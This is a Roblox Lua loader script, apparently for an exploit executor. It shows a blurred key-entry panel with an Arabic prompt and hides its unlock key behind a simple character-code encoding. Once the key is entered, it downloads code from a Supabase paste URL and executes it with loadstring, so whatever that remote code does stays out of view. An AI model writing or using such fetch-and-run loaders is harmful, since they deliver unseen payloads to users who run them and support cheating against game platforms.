local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")

local encoded = {54,55}

local function decode(t)
	local s = ""
	for _,v in ipairs(t) do
		s = s .. string.char(v)
	end
	return s
end

local key = decode(encoded)

-- Blur
local blur = Instance.new("BlurEffect")
blur.Size = 0
blur.Parent = Lighting

-- GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game.CoreGui

local Frame = Instance.new("Frame")
Frame.Parent = ScreenGui
Frame.Size = UDim2.new(0,320,0,200)
Frame.Position = UDim2.new(0.5,-160,-0.5,0)
Frame.BackgroundColor3 = Color3.fromRGB(20,20,20)

Instance.new("UICorner",Frame).CornerRadius = UDim.new(0,14)

local stroke = Instance.new("UIStroke",Frame)
stroke.Color = Color3.fromRGB(0,170,255)
stroke.Thickness = 2

local Title = Instance.new("TextLabel")
Title.Parent = Frame
Title.Size = UDim2.new(1,0,0,50)
Title.BackgroundTransparency = 1
Title.Text = "اكتب المفتاح الي عطاك اياه"
Title.TextScaled = true
Title.TextColor3 = Color3.fromRGB(255,255,255)

local TextBox = Instance.new("TextBox")
TextBox.Parent = Frame
TextBox.Size = UDim2.new(0.8,0,0,40)
TextBox.Position = UDim2.new(0.1,0,0.4,0)
TextBox.PlaceholderText = "Enter Key..."
TextBox.BackgroundColor3 = Color3.fromRGB(35,35,35)
TextBox.TextColor3 = Color3.fromRGB(255,255,255)
Instance.new("UICorner",TextBox).CornerRadius = UDim.new(0,10)

local Button = Instance.new("TextButton")
Button.Parent = Frame
Button.Size = UDim2.new(0.8,0,0,42)
Button.Position = UDim2.new(0.1,0,0.7,0)
Button.Text = "Unlock"
Button.BackgroundColor3 = Color3.fromRGB(0,170,255)
Button.TextColor3 = Color3.fromRGB(255,255,255)
Instance.new("UICorner",Button).CornerRadius = UDim.new(0,10)

-- Blur animation
TweenService:Create(
	blur,
	TweenInfo.new(0.5),
	{Size = 18}
):Play()

-- دخول القائمة
TweenService:Create(
	Frame,
	TweenInfo.new(0.6,Enum.EasingStyle.Back,Enum.EasingDirection.Out),
	{Position = UDim2.new(0.5,-160,0.5,-100)}
):Play()

Button.MouseButton1Click:Connect(function()

	if TextBox.Text == key then
		
		local close = TweenService:Create(
			Frame,
			TweenInfo.new(0.4),
			{Size = UDim2.new(0,0,0,0)}
		)
		
		close:Play()

		TweenService:Create(
			blur,
			TweenInfo.new(0.4),
			{Size = 0}
		):Play()

		close.Completed:Wait()

		loadstring(game:HttpGet("https://iyfvpnjrghsownkpazec.supabase.co/functions/v1/get-paste?slug=L8V01mix"))()

		blur:Destroy()
		ScreenGui:Destroy()
	end

end)
